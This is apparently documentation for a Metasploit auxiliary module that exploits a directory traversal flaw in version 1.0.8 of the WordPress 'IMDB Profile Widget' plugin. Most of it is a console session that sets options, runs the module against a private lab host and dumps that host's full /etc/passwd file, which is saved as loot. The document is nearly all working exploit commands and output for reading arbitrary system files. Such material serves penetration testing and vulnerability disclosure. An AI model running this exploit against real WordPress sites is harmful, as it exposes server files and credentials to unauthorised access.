#### Add WordPress Plugin IMDB Profile Widget File Read Vulnerability.

  Application: WordPress Plugin "IMDB Widget" 1.0.8
  Homepage: https://wordpress.org/plugins/imdb-widget/
  Source Code: https://downloads.wordpress.org/plugin/imdb-widget.1.0.8.zip
  Active Installs (wordpress.org): 30+
  
#### Vulnerable packages*
        
  1.0.8
  
#### Usage:

##### Linux (Ubuntu 14.04.5 LTS):
```
msf > use auxiliary/scanner/http/wp_imdb_widget_file_read 
msf auxiliary(wp_imdb_widget_file_read) > show options 

Module options (auxiliary/scanner/http/wp_imdb_widget_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      7                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_imdb_widget_file_read) > info

       Name: WordPress IMDB Profile Widget Plugin File Read Vulnerability
     Module: auxiliary/scanner/http/wp_imdb_widget_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  CrashBandicot
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DEPTH      7                yes       Traversal Depth (to reach the root folder)
  FILEPATH   /etc/passwd      yes       The path to the file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in 
  WordPress Plugin "IMDB Profile Widget" version 1.0.8, allowing to 
  read arbitrary files with the web server privileges.

References:
  https://packetstormsecurity.com/files/136447
  https://wpvulndb.com/vulnerabilities/8426

msf auxiliary(wp_imdb_widget_file_read) > set RHOSTS 192.168.100.5
RHOSTS => 192.168.100.5
msf auxiliary(wp_imdb_widget_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(wp_imdb_widget_file_read) > run

[*] Downloading file...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false

[+] File saved in: /home/hunter/.msf4/loot/20161126074902_default_192.168.100.5_imdbwidget.file_703459.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_imdb_widget_file_read) >

```
